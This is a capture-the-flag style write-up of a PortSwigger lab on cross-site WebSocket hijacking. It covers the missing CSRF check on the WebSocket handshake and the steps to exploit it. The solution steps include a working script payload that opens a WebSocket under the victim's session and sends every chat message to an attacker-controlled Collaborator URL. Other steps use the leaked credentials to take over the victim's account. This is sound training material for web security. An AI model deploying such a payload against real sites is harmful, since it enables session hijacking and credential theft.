# Cross-site WebSocket hijacking

## 📌 Lab Details
- **Title**: Cross-site WebSocket hijacking
- **Difficulty**: Practitioner
- **Category**: WebSockets
- **Lab URL**: https://portswigger.net/academy/labs/launch/a15ec3915bdc09700eea6c9fd20970de0aaf2bfbb87b3e7ec3d8d9800b8e542d?referrer=%2fweb-security%2fwebsockets%2fcross-site-websocket-hijacking%2flab

## 🔍 Summary
This lab demonstrates a **Cross-site WebSocket Hijacking (CSWSH)** vulnerability caused by the absence of CSRF protection during the WebSocket handshake. <br>
The application provides a live chat feature over WebSockets. Since the WebSocket handshake relies only on user's session cookie and does not validate the request's origin or include any anti-CSRF protection, an attacker can establish a WebSocket connection from a malicious website using the victim's authenticated session. <br>
By sendind the `READY` command, the attacker retrieves the victim's chat history and exfiltrates each recieved message to a Burp Collaborator server. The leaked chat history contains the victim's credentials, which can then be used to log in and solve the lab.

## 🛠 Steps to Solve
1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Copy the URL of the handshake request.
6. In the browser, go to the exploit server and paste the following template into the "Body" section:
   ```sh
   <script>
   var ws = new WebSocket('wss://your-websocket-url');
   ws.onopen = function() { ws.send("READY"); };
   ws.onmessage =  function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); };
   </script>
   ```
7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by Burp Collaborator.
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.

## 📖 Key Takeaways
-  WebSocket connections begin with an HTTP handshake before upgrading to the WebSocket protocol.
-  If the handshake lacks CSRF protection, an attacker can establish a WebSocket connection using the victim's authenticated session.
-  Once connected, an attacker can send arbitrary WebSocket messages exactly as the legitimate client would.
-  Sensitive data transmitted over WebSockets can be stolen if proper authentication and origin validation are missing.

## 🖼️ Screenshot 
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/4b8bb61d-ba0c-4cf2-a8db-d38bd044c88b" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/e4eda023-157d-4cb8-97d1-2326948fc39e" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/679aa02b-edda-461e-a907-02e81635e3a2" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/1bb9d044-6d03-4f66-87c3-4e2d32608914" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/38a3fa23-a50e-49d3-aa46-53b51dc05287" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/3f3d4f76-83af-447e-a385-37a17a7f8da4" />
